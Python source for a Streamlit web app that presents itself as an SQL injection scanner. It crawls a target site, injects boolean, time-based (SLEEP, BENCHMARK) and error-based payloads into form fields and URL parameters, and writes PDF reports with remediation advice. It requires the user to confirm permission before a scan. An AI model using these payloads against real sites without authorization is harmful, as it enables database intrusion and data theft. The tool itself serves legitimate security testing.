import streamlit as st
import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from bs4 import BeautifulSoup
from collections import deque
from io import BytesIO

# PDF Export Configuration
try:
    from reportlab.lib.pagesizes import letter
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
    from reportlab.lib.styles import getSampleStyleSheet
    REPORTLAB_AVAILABLE = True
except ImportError:
    REPORTLAB_AVAILABLE = False

class SQLiScannerPro:
    def __init__(self, target_url, timeout=10, max_pages=20, debug=True):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.max_pages = max_pages
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerable = False
        self.findings = []
        self.logs = []
        self.debug = debug
        self.visited = set()
        self.queue = deque()

        # Enhanced payloads for different DBMS
        self.payloads = {
            'boolean': [
                "' OR '1'='1' -- ",
                "' AND '1'='2' -- ",
                "\" OR \"1\"=\"1\" -- ",
                "\" AND \"1\"=\"2\" -- "
            ],
            'time': [
                "' OR (SELECT SLEEP(5))--",
                "\" OR (SELECT SLEEP(5))--",
                "' OR BENCHMARK(5000000,MD5(NOW()))--",
                "\" OR BENCHMARK(5000000,MD5(NOW()))--"
            ],
            'error': [
                "' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
                "\" AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
                "' AND 1=1/0--",
                "\" AND 1=1/0--"
            ]
        }

    def log(self, message, level="DEBUG"):
        """Log messages with different severity levels"""
        log_entry = f"[{level}] {message}"
        self.logs.append(log_entry)
        if self.debug or level != "DEBUG":
            print(log_entry)

    def normalize_url(self, url):
        """Normalize URL to avoid duplicates"""
        parsed = urlparse(url)
        path = parsed.path.rstrip('/') or '/'
        return f"{parsed.scheme}://{parsed.netloc}{path}"

    def is_same_domain(self, url):
        """Check if URL belongs to the same domain"""
        return urlparse(url).netloc == urlparse(self.target_url).netloc

    def crawl(self, progress_callback=None):
        """Crawl the website to discover pages"""
        self.queue.append(self.target_url)
        self.visited.add(self.normalize_url(self.target_url))
        pages_discovered = 0

        while self.queue and pages_discovered < self.max_pages:
            current_url = self.queue.popleft()
            pages_discovered += 1
            
            if progress_callback:
                progress_callback(pages_discovered / self.max_pages)

            try:
                response = self.session.get(current_url, timeout=self.timeout)
                if response.status_code != 200:
                    self.log(f"Skipping {current_url} - Status {response.status_code}", "INFO")
                    continue

                soup = BeautifulSoup(response.text, 'html.parser')

                # Discover links
                for link in soup.find_all(['a', 'link'], href=True):
                    url = urljoin(current_url, link['href'])
                    normalized = self.normalize_url(url)
                    
                    if (self.is_same_domain(url) and 
                        normalized not in self.visited and 
                        not any(ext in url.lower() for ext in ['.jpg', '.png', '.css', '.js'])):
                        self.visited.add(normalized)
                        self.queue.append(url)
                        self.log(f"Discovered: {url}")

            except Exception as e:
                self.log(f"Crawl error at {current_url}: {str(e)}", "ERROR")

    def extract_inputs(self, url):
        """Extract all input fields from a URL"""
        inputs = []
        
        # Extract GET parameters
        parsed = urlparse(url)
        get_params = list(parse_qs(parsed.query).keys())
        if get_params:
            inputs.append({
                'action': url,
                'method': 'get',
                'inputs': get_params
            })

        # Extract form inputs
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                action = form.get('action', url)
                method = form.get('method', 'get').lower()
                inputs_list = []
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    if input_tag.get('name') and input_tag.get('type') != 'submit':
                        inputs_list.append(input_tag.get('name'))
                
                if inputs_list:
                    inputs.append({
                        'action': urljoin(url, action),
                        'method': method,
                        'inputs': inputs_list
                    })
                    
        except Exception as e:
            self.log(f"Form extraction error at {url}: {str(e)}", "ERROR")
            
        return inputs

    def test_vulnerability(self, input_dict):
        """Test a single input for SQL injection vulnerabilities"""
        action = input_dict['action']
        method = input_dict['method']
        
        for field in input_dict['inputs']:
            # Boolean-based testing
            for payload in self.payloads['boolean']:
                try:
                    data = {field: payload}
                    
                    if method == 'get':
                        response = self.session.get(action, params=data, timeout=self.timeout)
                    else:
                        response = self.session.post(action, data=data, timeout=self.timeout)
                    
                    # Check for content differences
                    original_response = self.session.get(action, timeout=self.timeout)
                    if len(response.text) != len(original_response.text):
                        self.vulnerable = True
                        self.findings.append({
                            'input': field,
                            'type': 'Boolean-based',
                            'payload': payload,
                            'proof': 'Response length differs',
                            'url': self.build_test_url(action, field, payload, method),
                            'severity': 'High'
                        })
                        self.log(f"Boolean-based vulnerability found in {field} with payload: {payload}", "WARNING")
                        
                except Exception as e:
                    self.log(f"Boolean test error for {field}: {str(e)}", "ERROR")
            
            # Time-based testing
            for payload in self.payloads['time']:
                try:
                    start_time = time.time()
                    data = {field: payload}
                    
                    if method == 'get':
                        self.session.get(action, params=data, timeout=self.timeout)
                    else:
                        self.session.post(action, data=data, timeout=self.timeout)
                        
                    elapsed = time.time() - start_time
                    
                    if elapsed >= 5:
                        self.vulnerable = True
                        self.findings.append({
                            'input': field,
                            'type': 'Time-based',
                            'payload': payload,
                            'proof': f'Delay of {elapsed:.2f} seconds',
                            'url': self.build_test_url(action, field, payload, method),
                            'severity': 'Medium'
                        })
                        self.log(f"Time-based vulnerability found in {field} with payload: {payload}", "WARNING")
                        
                except Exception as e:
                    self.log(f"Time test error for {field}: {str(e)}", "ERROR")
            
            # Error-based testing
            for payload in self.payloads['error']:
                try:
                    data = {field: payload}
                    
                    if method == 'get':
                        response = self.session.get(action, params=data, timeout=self.timeout)
                    else:
                        response = self.session.post(action, data=data, timeout=self.timeout)
                    
                    error_keywords = [
                        'sql', 'syntax', 'mysql', 'ora-', 'odbc',
                        'conversion failed', 'unclosed quotation'
                    ]
                    
                    if any(keyword in response.text.lower() for keyword in error_keywords):
                        self.vulnerable = True
                        self.findings.append({
                            'input': field,
                            'type': 'Error-based',
                            'payload': payload,
                            'proof': 'Database error message detected',
                            'url': self.build_test_url(action, field, payload, method),
                            'severity': 'High'
                        })
                        self.log(f"Error-based vulnerability found in {field} with payload: {payload}", "WARNING")
                        
                except Exception as e:
                    self.log(f"Error test error for {field}: {str(e)}", "ERROR")

    def build_test_url(self, action, field, payload, method):
        """Build a test URL for demonstration"""
        if method == 'get':
            parsed = urlparse(action)
            query = parse_qs(parsed.query)
            query[field] = payload
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(query, doseq=True)}"
        else:
            return f"POST {action} with {field}={payload}"

    def quick_scan(self):
        """Scan only the target URL"""
        inputs = self.extract_inputs(self.target_url)
        for input_set in inputs:
            self.test_vulnerability(input_set)

    def deep_scan(self, progress_callback=None):
        """Full website scan with crawling"""
        self.crawl(progress_callback)
        for url in self.visited:
            inputs = self.extract_inputs(url)
            for input_set in inputs:
                self.test_vulnerability(input_set)

def generate_pdf_report(target, findings, logs):
    """Generate PDF report of scan results"""
    buffer = BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=letter)
    styles = getSampleStyleSheet()
    story = []

    # Title
    story.append(Paragraph("SQL Injection Scan Report", styles["Title"]))
    story.append(Spacer(1, 12))
    
    # Metadata
    story.append(Paragraph(f"<b>Target URL:</b> {target}", styles["Normal"]))
    story.append(Paragraph(f"<b>Scan Date:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}", styles["Normal"]))
    story.append(Spacer(1, 12))

    # Findings
    if findings:
        story.append(Paragraph("<b>Vulnerabilities Found:</b>", styles["Heading2"]))
        for finding in findings:
            story.append(Paragraph(f"<b>Type:</b> {finding['type']}", styles["Normal"]))
            story.append(Paragraph(f"<b>Input Field:</b> {finding['input']}", styles["Normal"]))
            story.append(Paragraph(f"<b>Severity:</b> {finding['severity']}", styles["Normal"]))
            story.append(Paragraph(f"<b>Payload:</b> {finding['payload']}", styles["Normal"]))
            story.append(Paragraph(f"<b>Proof:</b> {finding['proof']}", styles["Normal"]))
            story.append(Paragraph(f"<b>Example:</b> {finding['url']}", styles["Normal"]))
            story.append(Spacer(1, 12))
    else:
        story.append(Paragraph("No vulnerabilities detected.", styles["Normal"]))
        story.append(Spacer(1, 12))

    # Logs
    if logs:
        story.append(Paragraph("<b>Scan Logs:</b>", styles["Heading2"]))
        for log in logs:
            story.append(Paragraph(log, styles["Code"]))
    
    doc.build(story)
    buffer.seek(0)
    return buffer

def main():
    """Streamlit UI for the scanner"""
    st.set_page_config(
        page_title="Advanced SQL Injection Scanner",
        layout="wide",
        initial_sidebar_state="expanded"
    )

    st.title("🔍 Advanced SQL Injection Scanner")
    st.markdown("""
        <style>
            .stProgress > div > div > div > div {
                background-color: #4CAF50;
            }
            .st-b7 {
                color: white;
            }
            .st-cq {
                background-color: #2E7D32;
            }
            .stButton>button {
                background-color: #4CAF50;
                color: white;
            }
            .stAlert {
                border-left: 5px solid #4CAF50;
            }
        </style>
    """, unsafe_allow_html=True)

    # Sidebar
    with st.sidebar:
        st.image("https://via.placeholder.com/150x50?text=SQLi+Scanner", width=150)
        st.markdown("### Scan Configuration")
        scan_type = st.radio(
            "Scan Type",
            ["⚡ Quick Scan", "🔍 Deep Scan"],
            index=0
        )
        
        protocol = st.selectbox(
            "Protocol",
            ["https://", "http://"],
            index=0
        )
        
        target = st.text_input(
            "Target Domain",
            "example.com",
            help="Enter the domain or full URL to scan"
        )
        
        if scan_type == "🔍 Deep Scan":
            max_pages = st.slider(
                "Maximum Pages to Crawl",
                5, 100, 20,
                help="Limit the number of pages to scan"
            )
            timeout = st.slider(
                "Request Timeout (seconds)",
                5, 30, 10
            )
        else:
            max_pages = 1
            timeout = 10
        
        debug_mode = st.checkbox(
            "Enable Debug Mode",
            False,
            help="Show detailed scan logs"
        )
        
        st.markdown("---")
        st.markdown("### Terms of Service")
        authorized = st.checkbox(
            "I confirm I have permission to scan this target",
            False
        )
        
        if st.button("📄 View Terms of Service"):
            st.info("""
            **Terms of Service:**
            1. You must have explicit permission to scan the target
            2. Do not use this tool for malicious purposes
            3. The tool owner is not responsible for misuse
            """)

    # Main content
    tab1, tab2 = st.tabs(["📊 Scan Results", "📜 Logs"])

    if st.button("🚀 Start Scan", type="primary", use_container_width=True):
        if not authorized:
            st.error("⚠️ You must confirm authorization before scanning")
            st.stop()
            
        target_url = protocol + target.strip()
        
        with st.spinner(f"Initializing {scan_type} on {target_url}..."):
            scanner = SQLiScannerPro(
                target_url=target_url,
                timeout=timeout,
                max_pages=max_pages,
                debug=debug_mode
            )
            
            progress_bar = st.progress(0)
            
            def update_progress(progress):
                progress_bar.progress(progress)
            
            try:
                if scan_type == "⚡ Quick Scan":
                    scanner.quick_scan()
                else:
                    scanner.deep_scan(progress_callback=update_progress)
                
                with tab1:
                    if scanner.vulnerable:
                        st.success(f"✅ Found {len(scanner.findings)} vulnerabilities")
                        
                        for finding in scanner.findings:
                            with st.expander(
                                f"{finding['severity']} - {finding['type']} in {finding['input']}",
                                expanded=False
                            ):
                                st.markdown(f"""
                                **Input Field:** `{finding['input']}`  
                                **Vulnerability Type:** `{finding['type']}`  
                                **Severity:** `{finding['severity']}`  
                                **Payload Used:**  
                                ```sql
                                {finding['payload']}
                                ```  
                                **Proof of Concept:**  
                                {finding['proof']}  
                                **Example URL:**  
                                `{finding['url']}`
                                """)
                                
                                st.markdown("**Remediation:**")
                                st.info("""
                                - Use parameterized queries or prepared statements
                                - Implement proper input validation
                                - Apply the principle of least privilege for database accounts
                                """)
                    else:
                        st.success("🎉 No vulnerabilities detected!")
                        st.balloons()
                
                with tab2:
                    if debug_mode and scanner.logs:
                        st.markdown("### Scan Logs")
                        for log in scanner.logs:
                            if "DEBUG" in log:
                                st.code(log, language="log")
                            elif "ERROR" in log:
                                st.error(log)
                            elif "WARNING" in log:
                                st.warning(log)
                            else:
                                st.info(log)
                
                # PDF Export
                if REPORTLAB_AVAILABLE and (scanner.findings or debug_mode):
                    st.markdown("---")
                    pdf = generate_pdf_report(target_url, scanner.findings, scanner.logs)
                    st.download_button(
                        "📄 Download Full Report (PDF)",
                        data=pdf,
                        file_name=f"sqli_report_{time.strftime('%Y%m%d_%H%M%S')}.pdf",
                        mime="application/pdf",
                        use_container_width=True
                    )
                elif not REPORTLAB_AVAILABLE:
                    st.warning("⚠️ PDF reports require `reportlab`. Install with: `pip install reportlab`")
                    
            except Exception as e:
                st.error(f"🚨 Scan failed: {str(e)}")
                if debug_mode:
                    st.exception(e)

if __name__ == "__main__":
    main()
